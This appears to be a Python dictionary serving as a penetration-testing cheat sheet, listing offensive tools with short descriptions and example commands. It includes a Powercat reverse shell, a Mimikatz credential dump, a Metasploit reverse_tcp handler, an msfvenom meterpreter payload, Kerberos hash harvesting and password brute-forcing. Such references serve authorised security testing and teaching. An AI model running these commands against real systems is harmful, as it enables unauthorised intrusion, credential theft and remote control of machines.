all_tools = {
    "Scrape Websites": {
        "Cewl": {
            "description": "Scrapes website to generate wordlist for passwords/usernames.",
            "command": "cewl http://target_site -w output.txt"
        }
    },
    "Web application fuzzer": {
        "Wfuzz": {
            "description": "wfuzz is a tool designed for bruteforcing web applications. It can be used for finding resources not linked directories, servlets, scripts, etc., bruteforce GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP, etc.), bruteforce Forms parameters (User/Password), Fuzzing, etc. It replaces any reference to the FUZZ keyword by the value of a given payload.",
            "command": "wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://target_site/FUZZ"
        }
    },
    "Password extraction": {
        "Mimikatz": {
            "description": "Extracts plaintexts passwords, hash, PIN code and kerberos tickets from memory.",
            "command": "mimikatz || sekurlsa::logonPasswords"
        }
    },
    "Powershell tools": {
        "Powersploit": {
            "description": "PowerSploit is a collection of PowerShell modules and scripts designed for offensive security purposes, providing a comprehensive range of post-exploitation capabilities and exploit techniques for penetration testing and red teaming activities",
            "command": "Depends on the chosen script."
        }
    },
    "LLMNR, NBT-NS and MDNS poisoner": {
        "Responder": {
            "description": "“Responder” is a tool that acts as an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB1",
            "command": "responder -I eth0"
        }
    },
    "Active Directory": {
        "BloodHound": {
            "description": "“BloodHound” is an Active Directory (AD) reconnaissance tool that uses graph theory to visualize and reveal hidden relationships and attack paths within an Active Directory or Azure environment. It has a web application front-end built on top of Linkurious and Electron, and a Neo4j database back-end fed by data collectors or ingestors. The data collectors are written in PowerShell or C# and use native Windows API and LDAP functions to collect data from domain controllers and domain-joined systems. BloodHound can be used by both attackers and defenders to identify potential risks and vulnerabilities in Active Directory",
            "command": "Not a CLI tool, GUI-based."
        }
    },
    "Powershell version of netcat": {
        "Powercat": {
            "description": "“Powercat” is a PowerShell TCP/IP swiss army knife that works with Netcat & Ncat. It brings the functionality and power of Netcat to all recent versions of Microsoft Windows",
            "command": """powercat -c target_ip -p 4444 -e cmd"""
        }
    },
    "Python classes for working with network protocols": {
        "Impacket": {
            "description": "“Impacket” is a collection of Python classes for working with network protocols. It includes support for authentication, encryption, and signing. The tool can be used to perform a variety of tasks such as dumping credentials from Windows machines, performing password spraying attacks, and more",
            "command": """python GetNPUsers.py target_domain/ -usersfile user_list -format john -outputfile hashes"""
        }
    },
    "Data transfer tool (Download file)": {
        "Curl": {
            "description": "“Curl” is a data transfer tool that can be used to transfer data from or to a server using one of the supported protocols. It supports HTTP, HTTPS, FTP, FTPS, SCP, SFTP, TFTP, DICT, TELNET, LDAP or FILE protocols",
            'command': """curl -X GET http://target_site"""
        },

    "Wget": {
        "description": "“Wget” is a free utility for non-interactive download of files from the web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies.",
        'command': """wget http://target_site/path_to_file"""
    },

    "Scp": {
        "description": "“Scp” is a secure copy program to transfer files or directories between hosts on a network. It uses the same kind of security as SSH.",
        'command': """scp username@source:/path_to_file /destination_path"""
    },

    "Ftp": {
        "description": "“Ftp” is a standard network protocol used for the transfer of computer files between a client and server on a computer network.",
        'command': """ftp -n -v target_site"""
    },

    "Rsync": {
        "description": "“Rsync” is a fast, versatile file copying tool that can copy locally and to/from a remote host. It offers many options to control its behavior and features a delta-transfer algorithm.",
        'command': """rsync -avz source destination"""},
    },
    'Dynamic shellcode injection': {
        'Shellter': {'description': '“Shellter” is a dynamic shellcode injection tool and the first truly dynamic PE infector ever created. It can be used to inject shellcode into any Windows application that is running on the system',
                        'command': 'shellter -a -f input.exe'}
    },
    'Web Reconnaissance': {'Recon-ng': {'description': 'A full-featured web reconnaissance framework written in Python for extracting information from various web sources',
                                                                                    'command': 'recon-ng'}},
    'Local Linux Enumeration & Privilege Escalation Checks': {'LinEnum': {'description': 'A script that performs local Linux enumeration and privilege escalation checks',
                                                                                    'command': './LinEnum.sh'}},
    'Enumeration for Windows and Samba systems': {'Enum4linux': {'description': 'A tool for enumerating information from Windows and Samba systems',
                                                                                        'command': 'enum4linux -a target_ip'}},
    'Wordpress Enumeration': {'Ripper': {'description': 'A tool to find vulnerable code and functions of WordPress plugins',
                                                                                    'command': 'python ripper.py -u http://target_site'}},
    "Port Scan": {
        "Nmap": {
            "description": "Network mapper for network discovery and security auditing",
            "command": "nmap -sV -p- target_ip"
        },
        "Masscan": {
            "description": "A fast port scanner for large network ranges",
            "command": "masscan {ip_address} -p1-65535,U:1-65535 --wait 0 --rate 1000 -e {interface} > {output_file}"
        }
    },
    "Packet Analysis": {
        "Wireshark": {
            "description": "Packet analyzer used for network troubleshooting, analysis, software, and protocol development",
            "command": "wireshark -k -i eth0"
        }
    },
    "Reading from and writing to network connections": {
        "Netcat": {
            "description": "A utility for reading from and writing to network connections using TCP or UDP",
            'command': """nc -lvp 4444"""
        }
    },
    'Penetration testing, exploit development, and vulnerability research': {
        'Metasploit Framework': {'description': 'A framework for penetration testing, exploit development, and vulnerability research',
                                    'command': 'msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_ip; exploit\"'}
    },
    'Login Password Bruteforce': {'Hydra': {'description': 'A fast network logon cracker which supports many different services',
                                                                'command': 'hydra -l admin -P passwords.txt target_ip http-get /'}},
    'Password cracker': {'John the Ripper': {'description': 'A fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS',
                                                                                            'command': 'john --wordlist=rockyou.txt hash.txt'}, 'Hashcat': {'description': 'The worlds fastest and most advanced password recovery tool',
                                                'command': 'hashcat -m 0 -a 0 hash.txt wordlist.txt'}},
    'SQL Injection': {'SQLmap': {'description': 'An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws',
                                                                                        'command': 'sqlmap -u \"http://www.target.com/index.php?id=1\"'}},
    'Web server scanner': {'Nikto': {'description': 'An open source web server scanner which performs comprehensive tests against web servers',
                                                                                                'command': 'nikto -h http://target_ip'}},
    'Directory Brute Force': {'Dirb': {'description': 'A web content scanner that discovers directories and files on a web server',
                                                                                            'command': 'dirb http://target_ip'}, 'Gobuster': {'description': 'A directory/file & DNS busting tool written in Go',
                                                                        'command': 'gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'}},
    'Search Exploit Database': {'Searchsploit': {'description': 'A command-line search tool for the Exploit Database',
                                                                            'command': 'searchsploit apache 2.2'}},
    'Payload Generator': {'msfvenom': {'description': 'A tool to generate payload code for various platforms within Metasploit',
                                                                            'command': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe'}}
}
